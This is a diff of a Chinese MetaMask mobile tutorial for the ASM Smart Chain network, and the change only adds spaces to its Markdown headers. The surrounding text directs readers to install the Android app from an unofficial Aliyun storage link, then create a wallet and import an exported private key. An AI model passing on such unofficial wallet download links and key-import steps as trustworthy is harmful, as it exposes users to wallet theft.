@@ -1,10 +1,10 @@
 # metamask 手机端使用教程
 
-##步骤一：安装MetaMask
+## 步骤一：安装MetaMask
 安卓下载链接https://shafheqinvieqni.oss-accelerate.aliyuncs.com/metamask.apk（复制在浏览器打开）
 苹果下载链接https://testflight.apple.com/join/4cYoRF4M （复制在Safari浏览器打开）
 
-##步骤二：创建账户
+## 步骤二：创建账户
 安装完metamask之后点击打开，在APP页面点击get start进入钱包首页面，选择导入钱包或者创建新钱包；
 选择创建新钱包账户：
 <img src="https://github.com/AVMDEFI/ASM-Smart-Chain/blob/main/.github/assets/mobile-1.png" />
@@ -29,7 +29,7 @@
 注：在此页面中输入助记词时如果输入错误可以点击输入错误的单词重新进行输入
 
 
-##步骤三：设置网络连接ASM Smart Chain
+## 步骤三：设置网络连接ASM Smart Chain
 
 在登录进入metamask钱包之后，点击左上角的窗口栏，选择setting设置，进入设置页面；
 
@@ -63,7 +63,7 @@ Block Explorer URL: https://explorer.asm.am/
 
 <img src="https://github.com/AVMDEFI/ASM-Smart-Chain/blob/main/.github/assets/mobile-14.png" />
 
-##步骤四：导入AWallet钱包导出的ASM账户私钥
+## 步骤四：导入AWallet钱包导出的ASM账户私钥
 首先点击首页中点击账户上面的图标，会弹出一个页面；
       
 <img src="https://github.com/AVMDEFI/ASM-Smart-Chain/blob/main/.github/assets/mobile-15.png" />
